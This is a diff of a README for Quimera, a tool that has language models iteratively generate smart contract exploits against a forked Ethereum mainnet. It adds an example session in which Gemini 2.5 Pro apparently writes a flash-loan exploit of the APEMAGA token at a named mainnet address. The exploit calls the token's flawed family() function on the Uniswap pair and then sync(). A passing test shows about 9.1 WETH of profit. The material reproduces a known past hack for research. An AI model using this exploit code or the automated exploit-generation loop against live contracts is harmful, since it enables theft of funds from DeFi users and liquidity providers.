@@ -7,6 +7,8 @@ A simple tool to use LLMs to slowly approximate smart contract exploits in Found
 3. Run the potential exploit, record the trace and check if it produces profit or not. 
 4. Stop if profit is produced. Otherwise, go back to step (2) providing the trace of the failed exploit attempt. 
 
+**Status**: this prototype is on experimentation phase, so it is unclear which are the best parameters (e.g. temperature), how to optimize the prompt or what are the real capabilities. Stay tuned for updates!
+
 # Requirements
 
 * You will need an RPC provider (e.g. alchemy) and an Etherscan API key. Both have free options.
@@ -30,21 +32,180 @@ Note that in "manual mode", there is no need to install any plugin as the user w
 # Getting started
 
 1. Modify the mainnet.sh file to add the RPC and etherscan keys.
-2. Select a block number B and then execute `source mainnet.sh B"
-3. Invoke quimera:
+2. Select a block number B and then execute `source keys.sh B"
+3. Invoke Quimera:
 
 ```
 quimera TARGET --iterations 5 --model manual
 ```
 
+# Example session
 
-# Example sessions with Gemini 2.5
-
-```
-./keys.sh X
+This session shows the different steps to discover the [APEMAGA exploit](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/dc2cf9e53e9ccaf2eaf9806bad7cd914edefb41b/src/test/2024-06/APEMAGA_exp.sol#L23).  
 
 ```
-
+$ source keys.sh 
+$ quimera 0x56FF4AfD909AA66a1530fe69BF94c74e6D44500C --model manual --iterations 20
 ```
 
+Gemini 2.5 Pro Preview (05-06) was used in "manual mode", copying and pasting the prompt/answers. It took 5 attempts to reach a valid exploit. I ommited some steps where Gemini fixed some compilation errors or repeated the same output.
+
+The first attempt correctly swaps tokens, triggers the `family` function which is root cause, and tries to swaps token back:
+
+```
+    function receiveFlashLoan(
+        ...
+    ) external {
+        // 'token' is the address of the Tonken contract, available as a state variable in TestFlaw
+        // 'WETH' is the IWETH interface for WETH token, available as a state variable
+        // 'uniswapRouter' is IUniswapV2Router, available as a state variable
+        // 'uniswapPair' is IUniswapV2Pair, available as a state variable
+
+        uint256 amountWethToSwap = 10 ether; 
+
+        // 1. Swap WETH for Tonken
+        // Path: WETH -> Tonken
+        address[] memory pathWethToToken = new address[](2);
+        pathWethToToken[0] = address(WETH);
+        pathWethToToken[1] = token;
+
+        // Approvals for router are done in setUp()
+
+        // console.log("WETH balance before swap: %s", WETH.balanceOf(address(this)));
+        // console.log("Swapping %s WETH for Tonken...", amountWethToSwap);
+        // Use swapExactTokensForTokens as Tonken does not seem to have transfer fees based on provided code
+        uniswapRouter.swapExactTokensForTokens(
+            amountWethToSwap,
+            0, // amountOutMin: willing to accept any amount of Tonken
+            pathWethToToken,
+            address(this), // recipient of Tonken is this contract
+            block.timestamp // deadline
+        );
+        uint256 initialTonkenBalance = ERC20(token).balanceOf(address(this)); 
+        // console.log("Received %s Tonken. WETH balance after swap: %s", initialTonkenBalance, WETH.balanceOf(address(this)));
+        // console.log("Uniswap pair Tonken balance before family call: %s", ERC20(token).balanceOf(address(uniswapPair)));
+
+
+        // 2. Call Tonken.family() on the Uniswap pair address
+        // console.log("Calling Tonken.family() on Uniswap pair %s", address(uniswapPair));
+        ITonken(token).family(address(uniswapPair));
+        // console.log("Called Tonken.family(). Uniswap pair Tonken balance after family call: %s", ERC20(token).balanceOf(address(uniswapPair))); 
+
+
+        // 3. Get the current balance of Tonken held by this contract
+        uint256 tonkenBalanceToSwapBack = ERC20(token).balanceOf(address(this)); 
+        // console.log("Tonken balance to swap back: %s", tonkenBalanceToSwapBack);
+        require(tonkenBalanceToSwapBack > 0, "No Tonken to swap back");
+
+
+        // 4. Swap all Tonken back to WETH
+        // Path: Tonken -> WETH
+        address[] memory pathTokenToWeth = new address[](2);
+        pathTokenToWeth[0] = token;
+        pathTokenToWeth[1] = address(WETH);
+
+        // console.log("Swapping back %s Tonken for WETH...", tonkenBalanceToSwapBack);
+        // Use swapExactTokensForTokens
+        uniswapRouter.swapExactTokensForTokens(
+            tonkenBalanceToSwapBack,
+            0, // amountOutMin: willing to accept any amount of WETH
+            pathTokenToWeth,
+            address(this), // recipient of WETH is this contract
+            block.timestamp // deadline
+        );
+        // console.log("Swapped Tonken back to WETH. WETH balance: %s", WETH.balanceOf(address(this)));
+        
+        // DO NOT MODIFY THE FOLLOWING CODE 
+        ...
+    }
+```
+
+Then, it realizes that the Uniswap pair has not updated its reserves, so it calls `sync`.
+
+```
+    function receiveFlashLoan(
+        ...
+    ) external {
+        // 'token' is the address of the Tonken contract, available as a state variable in TestFlaw
+        // 'WETH' is the IWETH interface for WETH token, available as a state variable
+        // 'uniswapRouter' is IUniswapV2Router, available as a state variable
+        // 'uniswapPair' is IUniswapV2Pair, available as a state variable
+
+        uint256 amountWethToSwap = 100 ether; // Increased amount for better reserve manipulation
+
+        // 1. Swap WETH for Tonken
+        // Path: WETH -> Tonken
+        address[] memory pathWethToToken = new address[](2);
+        pathWethToToken[0] = address(WETH);
+        pathWethToToken[1] = token;
+
+        // Approvals for router are done in setUp()
+
+        // console.log("WETH balance before 1st swap: %s", WETH.balanceOf(address(this)));
+        // console.log("Swapping %s WETH for Tonken...", amountWethToSwap);
+        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amountWethToSwap,
+            0, // amountOutMin: willing to accept any amount of Tonken
+            pathWethToToken,
+            address(this), // recipient of Tonken is this contract
+            block.timestamp // deadline
+        );
+        uint256 initialTonkenBalance = ERC20(token).balanceOf(address(this)); 
+        // console.log("Received %s Tonken. WETH balance after 1st swap: %s", initialTonkenBalance, WETH.balanceOf(address(this)));
+        // console.log("Uniswap pair Tonken balance before family call: %s", ERC20(token).balanceOf(address(uniswapPair)));
+        // console.log("Uniswap pair WETH balance before family call: %s", WETH.balanceOf(address(uniswapPair)));
+
+        // 2. Call Tonken.family() on the Uniswap pair address
+        // This burns 99.9% of the Tonken from the Uniswap pair's balance directly in Tonken contract.
+        // console.log("Calling Tonken.family() on Uniswap pair %s", address(uniswapPair));
+        ITonken(token).family(address(uniswapPair));
+        // console.log("Called Tonken.family().");
+        // console.log("Uniswap pair Tonken balance (actual) after family call: %s", ERC20(token).balanceOf(address(uniswapPair)));
+        // (Pair's internal reserves are now stale)
+
+        // 3. Synchronize Uniswap pair reserves
+        // This updates the pair's internal reserves to match its actual (now very low) Tonken balance.
+        // console.log("Calling uniswapPair.sync()...");
+        uniswapPair.sync();
+        // console.log("Called uniswapPair.sync().");
+        // (Pair's internal Tonken reserve should now be very low)
+        // (Pair's internal WETH reserve reflects WETH deposited in step 1)
+
+        // 4. Get the current balance of Tonken held by this contract to swap back
+        uint256 tonkenBalanceToSwapBack = ERC20(token).balanceOf(address(this)); 
+        // console.log("Tonken balance to swap back: %s", tonkenBalanceToSwapBack);
+        require(tonkenBalanceToSwapBack > 0, "No Tonken to swap back");
+
+
+        // 5. Swap all Tonken back to WETH
+        // Path: Tonken -> WETH
+        address[] memory pathTokenToWeth = new address[](2);
+        pathTokenToWeth[0] = token;
+        pathTokenToWeth[1] = address(WETH);
+
+        // console.log("Swapping back %s Tonken for WETH...", tonkenBalanceToSwapBack);
+        // console.log("WETH balance before 2nd swap: %s", WETH.balanceOf(address(this)));
+        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            tonkenBalanceToSwapBack,
+            0, // amountOutMin: willing to accept any amount of WETH
+            pathTokenToWeth,
+            address(this), // recipient of WETH is this contract
+            block.timestamp // deadline
+        );
+        // console.log("Swapped Tonken back to WETH. Final WETH balance before repay: %s", WETH.balanceOf(address(this)));
+        
+        // DO NOT MODIFY THE FOLLOWING CODE 
+        ...
+    }
+```
+
+Finally, this code produces the correct exploit:
+
+```
+Ran 1 test for test/Test.t.sol:TestFlaw
+[PASS] testFlaw() (gas: 194413)
+Logs:
+  Initial balance 0
+  Surplus: 9136264858651799299 WETH
+  Final balance 9136264858651799299
 ```
